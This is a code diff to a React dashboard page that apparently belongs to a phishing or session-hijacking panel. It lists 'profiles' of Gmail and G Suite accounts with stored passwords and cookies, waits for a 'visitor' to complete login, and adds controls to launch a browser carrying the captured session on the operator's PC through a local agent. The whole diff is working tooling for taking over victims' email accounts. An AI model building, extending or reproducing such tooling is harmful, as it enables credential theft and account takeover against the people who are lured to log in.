@@ -6,6 +6,7 @@ import apiClient from '@/lib/api-client';
 import { Database, Play, X, Key, Eye, EyeOff, Check, ShieldCheck, Copy, Monitor, Activity, ArrowLeft, Trash2 } from 'lucide-react';
 import { formatDistanceToNow } from 'date-fns';
 import { toast } from 'sonner';
+import wsClient from '@/lib/websocket-client';
 
 interface Profile {
   id: string;
@@ -35,12 +36,48 @@ export default function ProfilesPage() {
   const [actionLoading, setActionLoading] = useState<string | null>(null);
   const [selectedProfile, setSelectedProfile] = useState<Profile | null>(null);
   const [showPassword, setShowPassword] = useState<{[key: string]: boolean}>({});
+  const [locallyLaunched, setLocallyLaunched] = useState<Set<string>>(new Set());
+  const [launchPending, setLaunchPending] = useState<Set<string>>(new Set());
   const [selected, setSelected] = useState<Set<string>>(new Set());
   const [confirmDelete, setConfirmDelete] = useState<{ type: 'single' | 'bulk'; id?: string; count?: number } | null>(null);
 
   useEffect(() => {
     loadProfiles();
   }, [domainTab]);
+
+  useEffect(() => {
+    const handleLaunchResult = (data: {
+      profileId: string;
+      success: boolean;
+      authenticated: boolean;
+      email?: string;
+      error?: string;
+    }) => {
+      setLaunchPending(prev => { const s = new Set(prev); s.delete(data.profileId); return s; });
+      if (data.success) {
+        setLocallyLaunched(prev => new Set(prev).add(data.profileId));
+        toast.success(
+          `${data.email || 'Profile'} launched on your PC${data.authenticated ? ' — authenticated ✓' : ''}`
+        );
+      } else {
+        toast.error(`Launch failed: ${data.error || 'Unknown error'}`);
+      }
+      loadProfiles();
+    };
+
+    const handleCloseResult = (data: { profileId: string; success: boolean }) => {
+      setLocallyLaunched(prev => { const s = new Set(prev); s.delete(data.profileId); return s; });
+      loadProfiles();
+    };
+
+    wsClient.onLaunchResult(handleLaunchResult);
+    wsClient.onCloseResult(handleCloseResult);
+
+    return () => {
+      wsClient.offLaunchResult(handleLaunchResult);
+      wsClient.offCloseResult(handleCloseResult);
+    };
+  }, []);
 
   const loadProfiles = async () => {
     setLoading(true);
@@ -67,13 +104,31 @@ export default function ProfilesPage() {
   };
 
   const handleLaunch = async (id: string) => {
+    const profile = profiles.find(p => p.id === id);
+    if (profile && profile.authStatus !== 'AUTHENTICATED') {
+      toast.error('Profile not authenticated yet — wait for the visitor to complete login');
+      return;
+    }
+
     setActionLoading(id);
+    setLaunchPending(prev => new Set(prev).add(id));
     try {
       const response = await apiClient.launchProfile(id);
-      toast.success('Browser launched with profile session');
-      await loadProfiles();
+      if (response.data.pending) {
+        toast.info('Launch command sent — browser opening on your PC...');
+        await loadProfiles();
+      } else {
+        toast.success('Browser launched with profile session');
+        await loadProfiles();
+      }
     } catch (error: any) {
-      toast.error(error.response?.data?.error || 'Failed to launch profile');
+      setLaunchPending(prev => { const s = new Set(prev); s.delete(id); return s; });
+      const errorData = error.response?.data;
+      if (errorData?.requiresAgent) {
+        toast.error('Agent not running. Start the FIONA agent on your PC first.');
+      } else {
+        toast.error(errorData?.error || 'Failed to launch profile');
+      }
     } finally {
       setActionLoading(null);
     }
@@ -83,7 +138,8 @@ export default function ProfilesPage() {
     setActionLoading(id);
     try {
       await apiClient.closeProfile(id);
-      toast.success('Profile session closed');
+      toast.success('Close command sent to agent');
+      setLocallyLaunched(prev => { const s = new Set(prev); s.delete(id); return s; });
       await loadProfiles();
     } catch (error: any) {
       toast.error(error.response?.data?.error || 'Failed to close profile');
@@ -168,15 +224,26 @@ export default function ProfilesPage() {
     email.toLowerCase().endsWith('@gmail.com') || email.toLowerCase().endsWith('@googlemail.com');
 
   const filteredProfiles = profiles.filter(profile => {
-    if (domainTab === 'GSUITE') return !isGmailAddress(profile.email);
-    if (domainTab === 'GMAIL') return isGmailAddress(profile.email);
+    const emailLower = profile.email.toLowerCase();
+    const isGmail = emailLower.endsWith('@gmail.com') || emailLower.endsWith('@googlemail.com');
+    if (domainTab === 'GSUITE') {
+      return profile.accountType === 'GSUITE' || !isGmail;
+    } else if (domainTab === 'GMAIL') {
+      return profile.accountType === 'GMAIL' || isGmail;
+    }
     return true;
   });
 
   const authenticatedCount = filteredProfiles.filter(p => p.authStatus === 'AUTHENTICATED').length;
   const launchedCount = profiles.filter(p => p.isLaunched).length;
-  const gsuiteCount = profiles.filter(p => !isGmailAddress(p.email)).length;
-  const gmailCount = profiles.filter(p => isGmailAddress(p.email)).length;
+  const gsuiteCount = profiles.filter(p => {
+    const e = p.email.toLowerCase();
+    return !e.endsWith('@gmail.com') && !e.endsWith('@googlemail.com');
+  }).length;
+  const gmailCount = profiles.filter(p => {
+    const e = p.email.toLowerCase();
+    return e.endsWith('@gmail.com') || e.endsWith('@googlemail.com');
+  }).length;
 
   return (
     <div className="mx-auto max-w-7xl p-8" style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
@@ -436,38 +503,56 @@ export default function ProfilesPage() {
 
               {/* Actions */}
               <div style={{ display: 'flex', gap: '8px' }}>
-                {profile.isLaunched ? (
+                {locallyLaunched.has(profile.id) ? (
                   <button
                     onClick={() => handleClose(profile.id)}
                     disabled={actionLoading === profile.id}
-                    style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', padding: '8px 16px', backgroundColor: 'rgba(239, 68, 68, 0.1)', color: '#EF4444', borderRadius: '8px', fontSize: '14px', fontWeight: 500, transition: 'background-color 0.2s', opacity: actionLoading === profile.id ? 0.5 : 1, border: 'none', cursor: 'pointer' }}
+                    style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', padding: '8px 16px', backgroundColor: 'rgba(239, 68, 68, 0.1)', color: '#EF4444', borderRadius: '8px', fontSize: '14px', fontWeight: 500, opacity: actionLoading === profile.id ? 0.5 : 1, border: 'none', cursor: 'pointer' }}
                   >
                     <X style={{ height: '16px', width: '16px' }} />
                     Close Session
                   </button>
-                ) : profile.authStatus === 'AUTHENTICATED' ? (
+                ) : (profile.cookies && profile.cookies.length > 0) ? (
                   <>
                     <button
                       onClick={() => handleLaunch(profile.id)}
-                      disabled={actionLoading === profile.id || launchedCount >= 5}
-                      style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', padding: '8px 16px', backgroundColor: '#4F7FFF', color: '#E2E8F0', borderRadius: '8px', fontSize: '14px', fontWeight: 500, transition: 'background-color 0.2s', opacity: (actionLoading === profile.id || launchedCount >= 5) ? 0.5 : 1, cursor: (actionLoading === profile.id || launchedCount >= 5) ? 'not-allowed' : 'pointer', border: 'none' }}
-                      title={launchedCount >= 5 ? 'Max 5 concurrent sessions' : 'Launch browser'}
+                      disabled={actionLoading === profile.id || launchPending.has(profile.id)}
+                      style={{
+                        flex: 1,
+                        display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
+                        padding: '8px 16px',
+                        backgroundColor: profile.authStatus !== 'AUTHENTICATED'
+                          ? 'rgba(255,255,255,0.05)'
+                          : launchPending.has(profile.id)
+                          ? 'rgba(79,127,255,0.3)'
+                          : '#4F7FFF',
+                        color: profile.authStatus !== 'AUTHENTICATED' ? 'rgba(226,232,240,0.4)' : '#E2E8F0',
+                        borderRadius: '8px', fontSize: '14px', fontWeight: 500,
+                        opacity: (actionLoading === profile.id || launchPending.has(profile.id)) ? 0.7 : 1,
+                        cursor: 'pointer', border: 'none',
+                      }}
+                      title={
+                        profile.authStatus !== 'AUTHENTICATED'
+                          ? 'Not authenticated yet'
+                          : launchPending.has(profile.id)
+                          ? 'Opening on your PC...'
+                          : 'Launch on your PC'
+                      }
                     >
                       <Monitor style={{ height: '16px', width: '16px' }} />
-                      Launch
+                      {launchPending.has(profile.id) ? 'Launching...' : 'Launch'}
                     </button>
                     <button
                       onClick={() => setSelectedProfile(profile)}
-                      style={{ padding: '8px 16px', backgroundColor: 'rgba(255, 255, 255, 0.05)', color: '#E2E8F0', borderRadius: '8px', fontSize: '14px', fontWeight: 500, transition: 'background-color 0.2s', border: 'none', cursor: 'pointer' }}
-                      title="View details"
+                      style={{ padding: '8px 16px', backgroundColor: 'rgba(255,255,255,0.05)', color: '#E2E8F0', borderRadius: '8px', fontSize: '14px', fontWeight: 500, border: 'none', cursor: 'pointer' }}
                     >
                       Details
                     </button>
                   </>
                 ) : (
                   <button
-                    disabled
-                    style={{ flex: 1, padding: '8px 16px', backgroundColor: 'rgba(255, 255, 255, 0.05)', color: 'rgba(226, 232, 240, 0.3)', borderRadius: '8px', fontSize: '14px', fontWeight: 500, cursor: 'not-allowed', border: 'none' }}
+                    onClick={() => setSelectedProfile(profile)}
+                    style={{ flex: 1, padding: '8px 16px', backgroundColor: 'rgba(255,255,255,0.05)', color: 'rgba(226,232,240,0.4)', borderRadius: '8px', fontSize: '14px', fontWeight: 500, border: 'none', cursor: 'pointer' }}
                   >
                     Not Authenticated
                   </button>
